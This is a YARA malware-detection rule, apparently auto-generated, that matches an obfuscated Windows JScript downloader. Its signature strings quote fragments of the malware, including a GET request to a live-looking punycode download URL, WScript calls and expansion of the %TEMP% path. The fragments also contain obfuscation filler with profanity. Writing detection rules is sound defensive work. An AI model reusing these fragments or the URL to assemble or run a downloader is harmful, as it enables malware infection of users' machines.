rule sig_20160428_5fc68b16801c40c8d91a3eb58a8ce660 {
  meta:
    description = "datamaliciousorder - file 20160428_5fc68b16801c40c8d91a3eb58a8ce660.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b71ec3520f108350f7093b9ca1553b2e8ec7576b1c00a8f57cf1bcd7fed1ddc9"

  strings:
    $s1  = "JfoYtpHcjWgvMxaFwvFoy[KrtHfhPfmTliLrsGoaAvv](\"G\" + \"ET\", \"http://xn--12ct7bab7ccc0ga4bik3a2b1koa4km8d.com/zmd7jf\", false);" ascii
    $s2  = "function UdqKqlSnjOfuYijYnlGjr(FhkNoaAhhYplQwtSdfFbx){EkiMvbAmgPesJogAogTce[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function UdqKqlSnjOfuYijYnlGjr(FhkNoaAhhYplQwtSdfFbx){EkiMvbAmgPesJogAogTce[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function LgpTysDljZoeXrnFgyKaj() {return EkiMvbAmgPesJogAogTce[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "return VwyKcbSwmTgdNqgUfuRxr - EevEsyBjxXrkAqiVnfLza;};" fullword ascii
    $s6  = "var EkiMvbAmgPesJogAogTce = function NqdNobDyuAseLorYfiJjw() {return JuaAtyZqdWrmSlaKjfYum[HmwWlcTnvJuhEgySklKui](\"WScript\"+\"" ascii
    $s7  = "var JuaAtyZqdWrmSlaKjfYum = this[\"WScript\"];" fullword ascii
    $s8  = "var EkiMvbAmgPesJogAogTce = function NqdNobDyuAseLorYfiJjw() {return JuaAtyZqdWrmSlaKjfYum[HmwWlcTnvJuhEgySklKui](\"WScript\"+\"" ascii
    $s9  = "}while (SvkPatGpnBkmEyeDysNvr);" fullword ascii
    $s10 = "function LgpTysDljZoeXrnFgyKaj() {return EkiMvbAmgPesJogAogTce[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function QcaZrjAwyBguXbnIeyVaw(VwyKcbSwmTgdNqgUfuRxr, EevEsyBjxXrkAqiVnfLza){VfnJklUlrBdyAakFroQnn = VfnJklUlrBdyAakFroQnn * 1; " ascii
    $s12 = "if (JfoYtpHcjWgvMxaFwvFoy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function OwgSbaGrjGcqQbtPlpQsg(){return HrnLllNeaAbpOigXqwPdf + \"\";};" fullword ascii
    $s14 = "function UuxWqjQgcToyHukPqmHqv() {return ((IceSniUcyIevBejKfnQgw == true) && (IceSniUcyIevBejKfnQgw == WyxHeqCfnJvqZfgOtvUaq)) ?" ascii
    $s15 = "function UuxWqjQgcToyHukPqmHqv() {return ((IceSniUcyIevBejKfnQgw == true) && (IceSniUcyIevBejKfnQgw == WyxHeqCfnJvqZfgOtvUaq)) ?" ascii
    $s16 = "var WyxHeqCfnJvqZfgOtvUaq = false;" fullword ascii
    $s17 = "IceSniUcyIevBejKfnQgw = true; " fullword ascii
    $s18 = "WyxHeqCfnJvqZfgOtvUaq = true; " fullword ascii
    $s19 = "var KfrBsjCezSpsZrzTqcZnr = false;" fullword ascii
    $s20 = "function IyrTirYweNcnUhbGprCkg(TkjGkeQrgAiqZdhObkGvr) {var SuiFmjDcjUytUgbXmzUwe = (1, 2, 3, 4, 5, TkjGkeQrgAiqZdhObkGvr); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}